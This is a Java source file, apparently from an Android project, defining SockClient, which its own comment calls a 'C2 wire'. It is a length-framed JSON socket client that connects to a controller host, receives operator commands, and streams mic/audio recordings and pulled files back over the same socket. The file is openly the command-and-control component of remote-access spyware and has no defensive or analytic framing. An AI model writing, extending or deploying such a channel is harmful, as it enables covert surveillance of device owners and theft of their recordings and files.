package com.lo.syskit;

import org.json.JSONObject;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * SockClient — the lightest possible C2 wire.
 *
 * Frame format (both directions):
 *   [ 4-byte big-endian length ][ UTF-8 JSON payload ]
 * Binary follow-ups (mic/audio, file pulls) ride after a JSON envelope
 * announcing their size, as [4-byte len][raw bytes] on the same socket.
 *
 * Zero dependencies. org.json ships in the platform.
 */
public final class SockClient {

    public interface OpHandler {
        /** Handle one op envelope; return the JSON reply (never null). */
        JSONObject handle(JSONObject op);
    }

    private final String host;
    private final int port;
    private Socket sock;
    private DataInputStream in;
    private DataOutputStream out;

    public SockClient(String host, int port) {
        this.host = host;
        this.port = port;
    }

    /** Connect with a hard timeout; returns false instead of throwing. */
    public boolean connect(int timeoutMs) {
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), timeoutMs);
            sock.setTcpNoDelay(true);
            sock.setKeepAlive(true);
            in = new DataInputStream(sock.getInputStream());
            out = new DataOutputStream(sock.getOutputStream());
            return true;
        } catch (Exception e) {
            closeQuietly();
            return false;
        }
    }

    public boolean isConnected() {
        return sock != null && sock.isConnected() && !sock.isClosed();
    }

    /** Send one JSON frame; returns false on any failure (caller reconnects). */
    public boolean send(JSONObject obj) {
        if (out == null) return false;
        try {
            byte[] payload = obj.toString().getBytes("UTF-8");
            out.writeInt(payload.length);
            out.write(payload);
            out.flush();
            return true;
        } catch (Exception e) {
            closeQuietly();
            return false;
        }
    }

    /** Blocking read of one JSON frame; null on clean disconnect/failure. */
    public JSONObject recv() {
        if (in == null) return null;
        try {
            int len = in.readInt();
            if (len <= 0 || len > 8 * 1024 * 1024) return null; // sanity cap
            byte[] buf = new byte[len];
            in.readFully(buf);
            return new JSONObject(new String(buf, "UTF-8"));
        } catch (Exception e) {
            closeQuietly();
            return null;
        }
    }

    /** Stream raw bytes after a JSON envelope announced them. */
    public boolean sendRaw(byte[] data) {
        if (out == null) return false;
        try {
            out.writeInt(data.length);
            out.write(data);
            out.flush();
            return true;
        } catch (Exception e) {
            closeQuietly();
            return false;
        }
    }

    /** Read a raw binary blob previously announced (size-capped). */
    public byte[] recvRaw(int expectedLen) {
        if (in == null || expectedLen <= 0 || expectedLen > 256 * 1024 * 1024)
            return null;
        try {
            byte[] buf = new byte[expectedLen];
            in.readFully(buf);
            return buf;
        } catch (Exception e) {
            closeQuietly();
            return null;
        }
    }

    public void closeQuietly() {
        try { if (out != null) out.close(); } catch (Exception ignore) {}
        try { if (in != null) in.close(); } catch (Exception ignore) {}
        try { if (sock != null) sock.close(); } catch (Exception ignore) {}
        in = null; out = null; sock = null;
    }
}
